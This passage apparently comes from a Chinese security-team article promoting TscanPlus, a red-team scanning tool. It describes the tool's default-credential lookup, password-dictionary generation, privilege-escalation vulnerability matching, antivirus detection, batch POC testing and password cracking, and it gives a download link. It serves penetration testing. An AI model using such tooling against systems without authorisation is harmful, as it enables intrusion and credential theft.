一键提取资产中的主域名、子域名、IP、URL、Tscan/Fscan结果。  
  
**子域名&IP地址(收缩模式)是所有【未指定端口】的子域名和IP地址的集合。在收缩模式下，类似ip:port或domain:port这种指定端口的资产会被剔除。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOyzMiaNBPCsFJ9XKg7ZfyNXQSWY5n2jdVacGTZ8uorKrnqtMRmibLrlhQ/640?wx_fmt=png&from=appmsg "")  
  
image-20240617181411005  
##### 【密码生成】  
  
提供了三种密码生成方式，包括社工字典生成、组织方式和枚举模式。可根据需求不同来生成更有针对性的字典文件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOUYS0wvLmtbzhYzp4o6GwAxZLh4NNO2XKicXYUicpk6h8F3WLbWUiaxTbg/640?wx_fmt=png&from=appmsg "")  
  
**【密码查询】**  
  
内置了10733条常见设备和产品的默认账号密码，可直接进行查询并导出。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOctQZBMFjVdYArvMNB5kbSs29a9cHm71ttK4sOEDQ2APFwkXbJFY86Q/640?wx_fmt=png&from=appmsg "")  
  
  
**【提权辅助】**  
  
根据systeminfo信息查询未修补的漏洞信息，返回漏洞微软编号、补丁编号、漏洞描述、影响系统等信息。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOxHsevX2An9ibicRoWuN2725RicMvncGMSdBdT7clmK6pOOOO9NGibSjz2A/640?wx_fmt=png&from=appmsg "")  
##### 【杀软查询】  
  
根据windows的tasklist信息，匹配杀软进程，内置1042条杀软识别规则。返回进程名称、进程ID、杀软名称等信息。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOFdQvsC1Z1zmZLQfUnYxcx1FbHoFNN9cv98zYsEZeicAw7lMQr8lu64g/640?wx_fmt=png&from=appmsg "")  
  
**【导出功能】**  
  
1、在所有功能模块中，新增了导出excel功能，默认会保存在程序根目录下。  
  
2、在所有功能模块中，可对所有列内容进行排序和个过滤。  
  
3、在所有功能模块中，可多选或全选模板，并进行批量操作，如进行poc检测、密码破解、目录枚举等。  
  
4、对软件执行过程中发现的所有资产、威胁进行实时保存，保存路径为程序所有在根目录下的result.txt文件中。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOZmJthcFPHKpVQ546cCZ1QibgvuzxrJ7EXUMSdzY5bXT9Fwc5bEibSxGw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOYu59ytBaRDBibricHdiboLvs4mCp7fx3CAY1gWwucFK7kp0hkeSND5h9w/640?wx_fmt=png&from=appmsg "")  
  
14、自定义功能  
  
1、增加数据库管理，可对所有数据进行持久存储和使用。默认DB文件会在config文件下生成。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEO2eezia23ezndF7KamLjDrkgmicEe1YkvV0ZE3UE2Y0ic4WyWRmNf93Idg/640?wx_fmt=png&from=appmsg "")  
  
2、对各功能配置参数写入配置文件，参数修改后只要执行一次相应功能就会写入配置文件，下次无需再次修改。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOJ5NCyZtqTfsKWtTos1KF3fd1ktWXofYflNqpXOBndgltF9cQ70Gzog/640?wx_fmt=png&from=appmsg "")  
  
3、红队命令、上线命令、默认密码等可自定义添加，并保存在配置文件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOYCYR0pKUylia4aTwFZNQgzicHJQ9xCbY6EcxAUsRBYnomrR339zictpYg/640?wx_fmt=png&from=appmsg "")  
  
4、增加系统主题设定，在任意页面打开"高级配置"，可对系统主题进行配置，选择深色或浅色模式。（该功能基于wails框架，mac兼容较好，在windows部分系统上应用可能存在问题）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOgywF3Nbbu55TLg6apXzul4WzPlVCGJX3jQ74NbuhaxEEboFzItFRkQ/640?wx_fmt=png&from=appmsg "")  
  
Mac系统下的的深色和浅色主题对比。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXrFcGYWDxQLSwIOa9S3iaEOxLsra9nO0cj7tHa0CCGnvCBAatgMHLvQGA2BsicmF6Mmv4y1J4iawP5w/640?wx_fmt=png&from=appmsg "")  
  
软件下载  
  
Github下载：https://github.com/TideSec/Tscanplus/releases  
  
部分功能还在完善（子域名模块、POC自定义功能等），目前暂不提供源码，这里打包了windows/mac版本的TscanPlus供下载。  
  
****  
****  
**【转发本文章到朋友圈，获赞30个以上，截图发到"Tide安全团队"公众号后台，可获取一个key，解锁所有POC功能。********】**  
  
  
  
往期推荐  
  
[TscanPlus-一款红队自动化工具](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247512632&idx=1&sn=8fb22d0814c7f9929ce59934ac3873e7&chksm=ce5d9059f92a194f30ed7cf6e839b654c649c4a72724619dc8d99dfb2cd08ae07065244b8614&scene=21#wechat_redirect)  
  
  
[潮影在线免杀平台上线了](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247499902&idx=1&sn=59cba8d980b4ecb0deefff99edaabd4d&chksm=ce5de21ff92a6b09a8972a0144557b0099e443aa8e018b17151c816fc7f08f3615ecb22617fc&scene=21#wechat_redirect)  
  
  
[自动化渗透测试工具开发实践](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247498466&idx=1&sn=085c15679436dedb06a179ca8d47951a&chksm=ce5dd883f92a5195ef74ac517741f6d3da0da40b5501d72016e52cb70344904bb85b8aef65ba&scene=21#wechat_redirect)  
  
  
[【红蓝对抗】利用CS进行内网横向](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247492640&idx=1&sn=43b1991dc5628eab322923083fde8d70&chksm=ce5dc641f92a4f57ffb18e2977644b1f977fcc5e0eccdf10956d3ae4ce70dc95024500631e89&scene=21#wechat_redirect)  
  
  
[一个Go版(更强大)的TideFinger](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247498344&idx=1&sn=3679330363ff6890166b09f6a502f769&chksm=ce5dd809f92a511f6066fcbb12fb5c1dc8c2642e4e2690dad64d76cc6f9247eae356d16f5810&scene=21#wechat_redirect)  
  
  
[SRC资产导航监测平台Tsrc上线了](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247499823&idx=1&sn=065ffeae6bd02fff922cfb12c5a0f4df&chksm=ce5de24ef92a6b58f709260b691e6b36e4a53aac00d3022946302b8e638696ed55c70e13e16f&scene=21#wechat_redirect)  
  
  
[新潮信息-Tide安全团队2022年度总结](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247506056&idx=1&sn=ad6dd23f58f5fd8ce899a1e292f5b685&chksm=ce5dfae9f92a73ff4f14c812436cb5bfecb29db04eada11c409e946d5338c82a92bcaa425736&scene=21#wechat_redirect)  
  
  
[记一次实战攻防(打点-Edr-内网-横向-Vcenter)](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247498965&idx=1&sn=655548831da6808a020ad07294a92e60&chksm=ce5ddeb4f92a57a283d5692c246e54655319ab0d09f6403e354300a2777cda6ae4c787631ab3&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/rTicZ9Hibb6RWbGNtVfIZbm2rmGO4hQDzQUrLN62vEGlA4fPmib5utUAp9gbQicb6FC82RjsVI5vx7wEc9yAAiaFEoQ/640?wx_fmt=gif "")  
  
E  
  
  
  
  
N  
  
  
  
  
D  
  
  
  
  
